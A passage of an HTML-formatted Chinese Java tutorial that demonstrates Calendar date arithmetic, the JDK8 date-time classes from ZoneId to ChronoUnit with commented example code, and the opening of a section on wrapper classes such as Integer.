class="string">&quot;星期四&quot;</span>, <span class="string">&quot;星期五&quot;</span>, <span class="string">&quot;星期六&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//            索引      [0]      [1]       [2]      [3]       [4]      [5]      [6]</span></span><br><span class="line">        <span class="comment">//查表</span></span><br><span class="line">        <span class="keyword">return</span> weekArray[w - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="add方法示例"><a class="header-anchor" href="#add方法示例">¶</a>add方法示例</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//计算200天以后是哪年哪月哪日，星期几？</span></span><br><span class="line">    	<span class="type">Calendar</span> <span class="variable">c2</span> <span class="operator">=</span> Calendar.getInstance();<span class="comment">//获取当前日期</span></span><br><span class="line">        c2.add(Calendar.DAY_OF_MONTH, <span class="number">200</span>);<span class="comment">//日期加200</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> c2.get(Calendar.YEAR);</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> c2.get(Calendar.MONTH) + <span class="number">1</span>;<span class="comment">//转换为实际的月份</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> c2.get(Calendar.DAY_OF_MONTH);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">wk</span> <span class="operator">=</span> c2.get(Calendar.DAY_OF_WEEK);</span><br><span class="line">        System.out.println(<span class="string">&quot;200天后是：&quot;</span> + y + <span class="string">&quot;年&quot;</span> + m + <span class="string">&quot;月&quot;</span> + d + <span class="string">&quot;日&quot;</span> + getWeek(wk));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查表法，查询星期几</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getWeek</span><span class="params">(<span class="type">int</span> w)</span> &#123;<span class="comment">//w = 1 --- 7</span></span><br><span class="line">        <span class="comment">//做一个表(数组)</span></span><br><span class="line">        String[] weekArray = &#123;<span class="string">&quot;星期日&quot;</span>, <span class="string">&quot;星期一&quot;</span>, <span class="string">&quot;星期二&quot;</span>, <span class="string">&quot;星期三&quot;</span>, <span class="string">&quot;星期四&quot;</span>, <span class="string">&quot;星期五&quot;</span>, <span class="string">&quot;星期六&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//            索引      [0]      [1]       [2]      [3]       [4]      [5]      [6]</span></span><br><span class="line">        <span class="comment">//查表</span></span><br><span class="line">        <span class="keyword">return</span> weekArray[w - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JDK8时间相关类"><a class="header-anchor" href="#JDK8时间相关类">¶</a>JDK8时间相关类</h3>
<table>
<thead>
<tr>
<th>JDK8时间类类名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>ZoneId</td>
<td>时区</td>
</tr>
<tr>
<td>Instant</td>
<td>时间戳</td>
</tr>
<tr>
<td>ZoneDateTime</td>
<td>带时区的时间</td>
</tr>
<tr>
<td>DateTimeFormatter</td>
<td>用于时间的格式化和解析</td>
</tr>
<tr>
<td>LocalDate</td>
<td>年、月、日</td>
</tr>
<tr>
<td>LocalTime</td>
<td>时、分、秒</td>
</tr>
<tr>
<td>LocalDateTime</td>
<td>年、月、日、时、分、秒</td>
</tr>
<tr>
<td>Duration</td>
<td>时间间隔（秒，纳，秒）</td>
</tr>
<tr>
<td>Period</td>
<td>时间间隔（年，月，日）</td>
</tr>
<tr>
<td>ChronoUnit</td>
<td>时间间隔（所有单位）</td>
</tr>
</tbody>
</table>
<h4 id="ZoneId-时区"><a class="header-anchor" href="#ZoneId-时区">¶</a>ZoneId  时区</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        static Set&lt;string&gt; getAvailableZoneIds() 获取Java中支持的所有时区</span></span><br><span class="line"><span class="comment">        static ZoneId systemDefault() 获取系统默认时区</span></span><br><span class="line"><span class="comment">        static Zoneld of(string zoneld) 获取一个指定时区</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.获取所有的时区名称</span></span><br><span class="line">Set&lt;String&gt; zoneIds = ZoneId.getAvailableZoneIds();</span><br><span class="line">System.out.println(zoneIds.size());<span class="comment">//600</span></span><br><span class="line">System.out.println(zoneIds);<span class="comment">// Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取当前系统的默认时区</span></span><br><span class="line"><span class="type">ZoneId</span> <span class="variable">zoneId</span> <span class="operator">=</span> ZoneId.systemDefault();</span><br><span class="line">System.out.println(zoneId);<span class="comment">//Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取指定的时区</span></span><br><span class="line"><span class="type">ZoneId</span> <span class="variable">zoneId1</span> <span class="operator">=</span> ZoneId.of(<span class="string">&quot;Asia/Pontianak&quot;</span>);</span><br><span class="line">System.out.println(zoneId1);<span class="comment">//Asia/Pontianak</span></span><br></pre></td></tr></table></figure>
<h4 id="Instant-时间戳"><a class="header-anchor" href="#Instant-时间戳">¶</a>Instant 时间戳</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            static Instant now() 获取当前时间的Instant对象(标准时间)</span></span><br><span class="line"><span class="comment">            static Instant ofXxxx(long epochMilli) 根据(秒/毫秒/纳秒)获取Instant对象</span></span><br><span class="line"><span class="comment">            ZonedDateTime atZone(ZoneIdzone) 指定时区</span></span><br><span class="line"><span class="comment">            boolean isxxx(Instant otherInstant) 判断系列的方法</span></span><br><span class="line"><span class="comment">            Instant minusXxx(long millisToSubtract) 减少时间系列的方法</span></span><br><span class="line"><span class="comment">            Instant plusXxx(long millisToSubtract) 增加时间系列的方法</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"><span class="comment">//1.获取当前时间的Instant对象(标准时间)</span></span><br><span class="line"><span class="type">Instant</span> <span class="variable">now</span> <span class="operator">=</span> Instant.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.根据(秒/毫秒/纳秒)获取Instant对象</span></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant1</span> <span class="operator">=</span> Instant.ofEpochMilli(<span class="number">0L</span>);</span><br><span class="line">System.out.println(instant1);<span class="comment">//1970-01-01T00:00:00z</span></span><br><span class="line"></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant2</span> <span class="operator">=</span> Instant.ofEpochSecond(<span class="number">1L</span>);</span><br><span class="line">System.out.println(instant2);<span class="comment">//1970-01-01T00:00:01Z</span></span><br><span class="line"></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant3</span> <span class="operator">=</span> Instant.ofEpochSecond(<span class="number">1L</span>, <span class="number">1000000000L</span>);</span><br><span class="line">System.out.println(instant3);<span class="comment">//1970-01-01T00:00:027</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 指定时区</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time</span> <span class="operator">=</span> Instant.now().atZone(ZoneId.of(<span class="string">&quot;Asia/Shanghai&quot;</span>));</span><br><span class="line">System.out.println(time);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.isXxx 判断</span></span><br><span class="line">Instant instant4=Instant.ofEpochMilli(<span class="number">0L</span>);</span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant5</span> <span class="operator">=</span>Instant.ofEpochMilli(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.用于时间的判断</span></span><br><span class="line"><span class="comment">//isBefore:判断调用者代表的时间是否在参数表示时间的前面</span></span><br><span class="line"><span class="type">boolean</span> result1=instant4.isBefore(instant5);</span><br><span class="line">System.out.println(result1);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//isAfter:判断调用者代表的时间是否在参数表示时间的后面</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">result2</span> <span class="operator">=</span> instant4.isAfter(instant5);</span><br><span class="line">System.out.println(result2);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//6.Instant minusXxx(long millisToSubtract) 减少时间系列的方法</span></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant6</span> <span class="operator">=</span>Instant.ofEpochMilli(<span class="number">3000L</span>);</span><br><span class="line">System.out.println(instant6);<span class="comment">//1970-01-01T00:00:03Z</span></span><br><span class="line"></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant7</span> <span class="operator">=</span>instant6.minusSeconds(<span class="number">1</span>);</span><br><span class="line">System.out.println(instant7);<span class="comment">//1970-01-01T00:00:02Z</span></span><br></pre></td></tr></table></figure>
<h4 id="ZoneDateTime-带时区的时间"><a class="header-anchor" href="#ZoneDateTime-带时区的时间">¶</a>ZoneDateTime  带时区的时间</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            static ZonedDateTime now() 获取当前时间的ZonedDateTime对象</span></span><br><span class="line"><span class="comment">            static ZonedDateTime ofXxxx(。。。) 获取指定时间的ZonedDateTime对象</span></span><br><span class="line"><span class="comment">            ZonedDateTime withXxx(时间) 修改时间系列的方法</span></span><br><span class="line"><span class="comment">            ZonedDateTime minusXxx(时间) 减少时间系列的方法</span></span><br><span class="line"><span class="comment">            ZonedDateTime plusXxx(时间) 增加时间系列的方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="comment">//1.获取当前时间对象(带时区)</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">now</span> <span class="operator">=</span> ZonedDateTime.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取指定的时间对象(带时区)1/年月日时分秒纳秒方式指定</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time1</span> <span class="operator">=</span> ZonedDateTime.of(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">1</span>,</span><br><span class="line">                                       <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">0</span>, ZoneId.of(<span class="string">&quot;Asia/Shanghai&quot;</span>));</span><br><span class="line">System.out.println(time1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过Instant + 时区的方式指定获取时间对象</span></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant</span> <span class="operator">=</span> Instant.ofEpochMilli(<span class="number">0L</span>);</span><br><span class="line"><span class="type">ZoneId</span> <span class="variable">zoneId</span> <span class="operator">=</span> ZoneId.of(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time2</span> <span class="operator">=</span> ZonedDateTime.ofInstant(instant, zoneId);</span><br><span class="line">System.out.println(time2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.withXxx 修改时间系列的方法</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time3</span> <span class="operator">=</span> time2.withYear(<span class="number">2000</span>);</span><br><span class="line">System.out.println(time3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 减少时间</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time4</span> <span class="operator">=</span> time3.minusYears(<span class="number">1</span>);</span><br><span class="line">System.out.println(time4);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.增加时间</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time5</span> <span class="operator">=</span> time4.plusYears(<span class="number">1</span>);</span><br><span class="line">System.out.println(time5);</span><br></pre></td></tr></table></figure>
<h4 id="DateTimeFormatter-用于时间的格式化和解析"><a class="header-anchor" href="#DateTimeFormatter-用于时间的格式化和解析">¶</a>DateTimeFormatter   用于时间的格式化和解析</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    static DateTimeFormatter ofPattern(格式) 获取格式对象</span></span><br><span class="line"><span class="comment">    String format(时间对象) 按照指定方式格式化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//获取时间对象</span></span><br><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">time</span> <span class="operator">=</span> Instant.now().atZone(ZoneId.of(<span class="string">&quot;Asia/Shanghai&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析/格式化器</span></span><br><span class="line"><span class="type">DateTimeFormatter</span> <span class="variable">dtf1</span> <span class="operator">=</span> DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy-MM-dd HH:mm;ss EE a&quot;</span>);</span><br><span class="line"><span class="comment">// 格式化</span></span><br><span class="line">System.out.println(dtf1.format(time));</span><br></pre></td></tr></table></figure>
<h4 id="LocalDate-年、月、日"><a class="header-anchor" href="#LocalDate-年、月、日">¶</a>LocalDate  年、月、日</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取当前时间的日历对象(包含 年月日)</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">nowDate</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line"><span class="comment">//System.out.println(&quot;今天的日期:&quot; + nowDate);</span></span><br><span class="line"><span class="comment">//2.获取指定的时间的日历对象</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">ldDate</span> <span class="operator">=</span> LocalDate.of(<span class="number">2023</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;指定日期:&quot;</span> + ldDate);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.get系列方法获取日历中的每一个属性值//获取年</span></span><br><span class="line"><span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> ldDate.getYear();</span><br><span class="line">System.out.println(<span class="string">&quot;year: &quot;</span> + year);</span><br><span class="line"><span class="comment">//获取月//方式一:</span></span><br><span class="line"><span class="type">Month</span> <span class="variable">m</span> <span class="operator">=</span> ldDate.getMonth();</span><br><span class="line">System.out.println(m);</span><br><span class="line">System.out.println(m.getValue());</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二:</span></span><br><span class="line"><span class="type">int</span> <span class="variable">month</span> <span class="operator">=</span> ldDate.getMonthValue();</span><br><span class="line">System.out.println(<span class="string">&quot;month: &quot;</span> + month);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取日</span></span><br><span class="line"><span class="type">int</span> <span class="variable">day</span> <span class="operator">=</span> ldDate.getDayOfMonth();</span><br><span class="line">System.out.println(<span class="string">&quot;day:&quot;</span> + day);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取一年的第几天</span></span><br><span class="line"><span class="type">int</span> <span class="variable">dayofYear</span> <span class="operator">=</span> ldDate.getDayOfYear();</span><br><span class="line">System.out.println(<span class="string">&quot;dayOfYear:&quot;</span> + dayofYear);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取星期</span></span><br><span class="line"><span class="type">DayOfWeek</span> <span class="variable">dayOfWeek</span> <span class="operator">=</span> ldDate.getDayOfWeek();</span><br><span class="line">System.out.println(dayOfWeek);</span><br><span class="line">System.out.println(dayOfWeek.getValue());</span><br><span class="line"></span><br><span class="line"><span class="comment">//is开头的方法表示判断</span></span><br><span class="line">System.out.println(ldDate.isBefore(ldDate));</span><br><span class="line">System.out.println(ldDate.isAfter(ldDate));</span><br><span class="line"></span><br><span class="line"><span class="comment">//with开头的方法表示修改，只能修改年月日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">withLocalDate</span> <span class="operator">=</span> ldDate.withYear(<span class="number">2000</span>);</span><br><span class="line">System.out.println(withLocalDate);</span><br><span class="line"></span><br><span class="line"><span class="comment">//minus开头的方法表示减少，只能减少年月日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">minusLocalDate</span> <span class="operator">=</span> ldDate.minusYears(<span class="number">1</span>);</span><br><span class="line">System.out.println(minusLocalDate);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//plus开头的方法表示增加，只能增加年月日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">plusLocalDate</span> <span class="operator">=</span> ldDate.plusDays(<span class="number">1</span>);</span><br><span class="line">System.out.println(plusLocalDate);</span><br><span class="line"></span><br><span class="line"><span class="comment">//-------------</span></span><br><span class="line"><span class="comment">// 判断今天是否是你的生日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">birDate</span> <span class="operator">=</span> LocalDate.of(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">nowDate1</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line"></span><br><span class="line"><span class="type">MonthDay</span> <span class="variable">birMd</span> <span class="operator">=</span> MonthDay.of(birDate.getMonthValue(), birDate.getDayOfMonth());</span><br><span class="line"><span class="type">MonthDay</span> <span class="variable">nowMd</span> <span class="operator">=</span> MonthDay.from(nowDate1);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;今天是你的生日吗? &quot;</span> + birMd.equals(nowMd));<span class="comment">//今天是你的生日吗?</span></span><br></pre></td></tr></table></figure>
<h4 id="LocalTime-时、分、秒"><a class="header-anchor" href="#LocalTime-时、分、秒">¶</a>LocalTime  时、分、秒</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取本地时间的日历对象。(包含 时分秒)</span></span><br><span class="line"><span class="type">LocalTime</span> <span class="variable">nowTime</span> <span class="operator">=</span> LocalTime.now();</span><br><span class="line">System.out.println(<span class="string">&quot;今天的时间:&quot;</span> + nowTime);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">hour</span> <span class="operator">=</span> nowTime.getHour();<span class="comment">//时</span></span><br><span class="line">System.out.println(<span class="string">&quot;hour: &quot;</span> + hour);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">minute</span> <span class="operator">=</span> nowTime.getMinute();<span class="comment">//分</span></span><br><span class="line">System.out.println(<span class="string">&quot;minute: &quot;</span> + minute);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">second</span> <span class="operator">=</span> nowTime.getSecond();<span class="comment">//秒</span></span><br><span class="line">System.out.println(<span class="string">&quot;second:&quot;</span> + second);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">nano</span> <span class="operator">=</span> nowTime.getNano();<span class="comment">//纳秒</span></span><br><span class="line">System.out.println(<span class="string">&quot;nano:&quot;</span> + nano);</span><br><span class="line">System.out.println(<span class="string">&quot;------------------------------------&quot;</span>);</span><br><span class="line">System.out.println(LocalTime.of(<span class="number">8</span>, <span class="number">20</span>));<span class="comment">//时分</span></span><br><span class="line">System.out.println(LocalTime.of(<span class="number">8</span>, <span class="number">20</span>, <span class="number">30</span>));<span class="comment">//时分秒</span></span><br><span class="line">System.out.println(LocalTime.of(<span class="number">8</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">150</span>));<span class="comment">//时分秒纳秒</span></span><br><span class="line"><span class="type">LocalTime</span> <span class="variable">mTime</span> <span class="operator">=</span> LocalTime.of(<span class="number">8</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">150</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//is系列的方法</span></span><br><span class="line">System.out.println(nowTime.isBefore(mTime));</span><br><span class="line">System.out.println(nowTime.isAfter(mTime));</span><br><span class="line"></span><br><span class="line"><span class="comment">//with系列的方法，只能修改时、分、秒</span></span><br><span class="line">System.out.println(nowTime.withHour(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//plus系列的方法，只能修改时、分、秒</span></span><br><span class="line">System.out.println(nowTime.plusHours(<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<h4 id="LocalDateTime-年、月、日、时、分、秒"><a class="header-anchor" href="#LocalDateTime-年、月、日、时、分、秒">¶</a>LocalDateTime  年、月、日、时、分、秒</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前时间的的日历对象(包含年月日时分秒)</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">nowDateTime</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;今天是:&quot;</span> + nowDateTime);<span class="comment">//今天是：</span></span><br><span class="line">System.out.println(nowDateTime.getYear());<span class="comment">//年</span></span><br><span class="line">System.out.println(nowDateTime.getMonthValue());<span class="comment">//月</span></span><br><span class="line">System.out.println(nowDateTime.getDayOfMonth());<span class="comment">//日</span></span><br><span class="line">System.out.println(nowDateTime.getHour());<span class="comment">//时</span></span><br><span class="line">System.out.println(nowDateTime.getMinute());<span class="comment">//分</span></span><br><span class="line">System.out.println(nowDateTime.getSecond());<span class="comment">//秒</span></span><br><span class="line">System.out.println(nowDateTime.getNano());<span class="comment">//纳秒</span></span><br><span class="line"><span class="comment">// 日:当年的第几天</span></span><br><span class="line">System.out.println(<span class="string">&quot;dayofYear:&quot;</span> + nowDateTime.getDayOfYear());</span><br><span class="line"><span class="comment">//星期</span></span><br><span class="line">System.out.println(nowDateTime.getDayOfWeek());</span><br><span class="line">System.out.println(nowDateTime.getDayOfWeek().getValue());</span><br><span class="line"><span class="comment">//月份</span></span><br><span class="line">System.out.println(nowDateTime.getMonth());</span><br><span class="line">System.out.println(nowDateTime.getMonth().getValue());</span><br><span class="line"></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">ld</span> <span class="operator">=</span> nowDateTime.toLocalDate();</span><br><span class="line">System.out.println(ld);</span><br><span class="line"></span><br><span class="line"><span class="type">LocalTime</span> <span class="variable">lt</span> <span class="operator">=</span> nowDateTime.toLocalTime();</span><br><span class="line">System.out.println(lt.getHour());</span><br><span class="line">System.out.println(lt.getMinute());</span><br><span class="line">System.out.println(lt.getSecond());</span><br></pre></td></tr></table></figure>
<h4 id="Duration-时间间隔（秒，纳秒）"><a class="header-anchor" href="#Duration-时间间隔（秒，纳秒）">¶</a>Duration  时间间隔（秒，纳秒）</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 本地日期时间对象。</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">today</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">System.out.println(today);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出生的日期时间对象</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">birthDate</span> <span class="operator">=</span> LocalDateTime.of(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">System.out.println(birthDate);</span><br><span class="line"></span><br><span class="line"><span class="type">Duration</span> <span class="variable">duration</span> <span class="operator">=</span> Duration.between(birthDate, today);<span class="comment">//第二个参数减第一个参数</span></span><br><span class="line">System.out.println(<span class="string">&quot;相差的时间间隔对象:&quot;</span> + duration);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;============================================&quot;</span>);</span><br><span class="line">System.out.println(duration.toDays());<span class="comment">//两个时间差的天数</span></span><br><span class="line">System.out.println(duration.toHours());<span class="comment">//两个时间差的小时数</span></span><br><span class="line">System.out.println(duration.toMinutes());<span class="comment">//两个时间差的分钟数</span></span><br><span class="line">System.out.println(duration.toMillis());<span class="comment">//两个时间差的毫秒数</span></span><br><span class="line">System.out.println(duration.toNanos());<span class="comment">//两个时间差的纳秒数</span></span><br></pre></td></tr></table></figure>
<h4 id="Period-时间间隔（年、月、日）"><a class="header-anchor" href="#Period-时间间隔（年、月、日）">¶</a>Period  时间间隔（年、月、日）</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前本地 年月日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">today</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line">System.out.println(today);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生日的 年月日</span></span><br><span class="line"><span class="type">LocalDate</span> <span class="variable">birthDate</span> <span class="operator">=</span> LocalDate.of(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">System.out.println(birthDate);</span><br><span class="line"></span><br><span class="line"><span class="type">Period</span> <span class="variable">period</span> <span class="operator">=</span> Period.between(birthDate, today);<span class="comment">//第二个参数减第一个参数</span></span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;相差的时间间隔对象:&quot;</span> + period);</span><br><span class="line">System.out.println(period.getYears());</span><br><span class="line">System.out.println(period.getMonths());</span><br><span class="line">System.out.println(period.getDays());</span><br><span class="line"></span><br><span class="line">System.out.println(period.toTotalMonths());</span><br></pre></td></tr></table></figure>
<h4 id="ChronoUnit-时间间隔（所有单位）"><a class="header-anchor" href="#ChronoUnit-时间间隔（所有单位）">¶</a>ChronoUnit  时间间隔（所有单位）</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前时间</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">today</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">System.out.println(today);</span><br><span class="line"><span class="comment">// 生日时间</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">birthDate</span> <span class="operator">=</span> LocalDateTime.of(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">System.out.println(birthDate);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;相差的年数:&quot;</span> + ChronoUnit.YEARS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的月数:&quot;</span> + ChronoUnit.MONTHS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的周数:&quot;</span> + ChronoUnit.WEEKS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的天数:&quot;</span> + ChronoUnit.DAYS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的时数:&quot;</span> + ChronoUnit.HOURS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的分数:&quot;</span> + ChronoUnit.MINUTES.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的秒数:&quot;</span> + ChronoUnit.SECONDS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的毫秒数:&quot;</span> + ChronoUnit.MILLIS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的微秒数:&quot;</span> + ChronoUnit.MICROS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的纳秒数:&quot;</span> + ChronoUnit.NANOS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的半天数:&quot;</span> + ChronoUnit.HALF_DAYS.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的十年数:&quot;</span> + ChronoUnit.DECADES.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的世纪(百年)数:&quot;</span> + ChronoUnit.CENTURIES.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的千年数:&quot;</span> + ChronoUnit.MILLENNIA.between(birthDate, today));</span><br><span class="line">System.out.println(<span class="string">&quot;相差的纪元数:&quot;</span> + ChronoUnit.ERAS.between(birthDate, today));</span><br></pre></td></tr></table></figure>
<h3 id="包装类"><a class="header-anchor" href="#包装类">¶</a>包装类</h3>
<ul>
<li>Java提供了两个类型系统，<strong>基本类型</strong>与<strong>引用类型</strong>，<u>使用基本类型在于效率</u>，然而很多情况，会创建对象使用，因为<u>对象可以做更多的功能</u>，如果想要我们的基本类型像对象一样操作，就可以<u>使用基本类型对应的包装类</u></li>
</ul>
<table>
<thead>
<tr>
<th>基本类型</th>
<th>对应的包装类（位于java.lang包中）</th>
</tr>
</thead>
<tbody>
<tr>
<td>byte</td>
<td>Byte</td>
</tr>
<tr>
<td>short</td>
<td>Short</td>
</tr>
<tr>
<td>int</td>
<td><strong>Integer</strong></td>
</tr>
<tr>
<td>long</td>
<td>Long</td>
</tr>
<tr>
<td>float</td>
<td>Float</td>
</tr>
<tr>
<td>double</td>
<td>Double</td>
</tr>
<tr>
<td>char</td>
<td><strong>Character</strong></td>
</tr>
<tr>
<td>boolean</td>
<td>Boolean</td>
</tr>
</tbody>
</table>
<h4 id="Integer类"><a class="header-anchor" href="#Integer类">¶</a>Integer类</h4>
<ul>
<li>概述：包装一个对象中的原始类型 int 的值</li>
</ul>
<h5 id="Integer类构造方法及静态方法"><a class="header-anchor" href="#Integer类构造方法及静态方法">¶</a>Integer类构造方法及静态方法</h5>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>public Integer(int value)</td>
<td>根据 int 值创建 Integer 对象(过时)</td>
</tr>
<tr>
<td>public Integer(String s)</td>
<td>根据 String 值创建 Integer 对象(过时)</td>
</tr>
<tr>
